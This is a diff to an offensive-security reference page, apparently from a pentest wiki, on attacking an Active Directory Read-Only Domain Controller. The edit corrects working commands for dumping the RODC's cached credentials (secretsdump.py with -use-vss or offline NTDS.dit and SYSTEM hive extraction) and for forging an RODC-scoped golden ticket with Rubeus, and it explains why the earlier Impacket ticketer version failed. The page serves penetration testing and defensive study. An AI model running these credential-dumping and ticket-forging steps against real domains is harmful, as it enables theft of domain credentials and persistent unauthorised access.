@@ -24,9 +24,10 @@ A **Read-Only Domain Controller** holds a filtered, read-only copy of the direct
 With admin on the RODC, dump the secrets it has cached locally for every allowed principal:
 
 ```bash
-# cached domain credentials from a compromised RODC (its local copy, incl. the RODC krbtgt)
-secretsdump.py 'EXAMPLE/rodc-admin@<rodc>' -just-dc
-# or lsadump / the registry hives on the box
+# an RODC does not replicate outward, so DRSUAPI (-just-dc) fails; read its LOCAL NTDS.dit
+secretsdump.py -just-dc -use-vss 'EXAMPLE/rodc-admin@<rodc>'   # VSS snapshot of the local DB
+# or copy ntds.dit + the SYSTEM hive off the box and extract offline:
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
 ## The RODC golden ticket
@@ -34,9 +35,10 @@ secretsdump.py 'EXAMPLE/rodc-admin@<rodc>' -just-dc
 The RODC has its **own krbtgt key**. Forge a TGT with it, and a **writable** DC will honour that ticket, but only for principals the RODC is allowed to reveal (in `msDS-RevealOnDemandGroup`, not in `msDS-NeverRevealGroup`) and only with the correct **key version number**:
 
 ```bash
-# forge with the RODC krbtgt key and its kvno; usable for allowed principals against a writable DC
-ticketer.py -nthash <rodc-krbtgt-hash> -domain-sid <sid> -domain example.local \
-  -user-id 1137 -groups <allowed> allowed_user
+# Rubeus forges the RODC branch (sets the RODC number and matching kvno); plain ticketer.py
+# hardcodes kvno 2 and cannot set the RODC number, so a writable DC rejects its ticket
+Rubeus.exe golden /rc4:<rodc-krbtgt-hash> /rodcNumber:<N> /user:allowed_user /id:<rid> \
+  /domain:example.local /sid:<sid> /groups:<allowed>
 ```
 
 ## Exploitation notes
@@ -48,8 +50,9 @@ ticketer.py -nthash <rodc-krbtgt-hash> -domain-sid <sid> -domain example.local \
 
 ## Tools
 
-- **Impacket** (`secretsdump.py`, `ticketer.py`): dump cached secrets and forge the RODC-scoped TGT.
-- **mimikatz / Rubeus**: local secret extraction and ticket forging on Windows.
+- **Impacket `secretsdump.py`** (`-use-vss` or offline `-ntds ... LOCAL`): dump the RODC's locally cached secrets.
+- **Rubeus** (`golden /rodcNumber`): forge the RODC-scoped TGT with the correct RODC number and kvno.
+- **mimikatz**: local secret extraction on the box.
 
 ## References
 
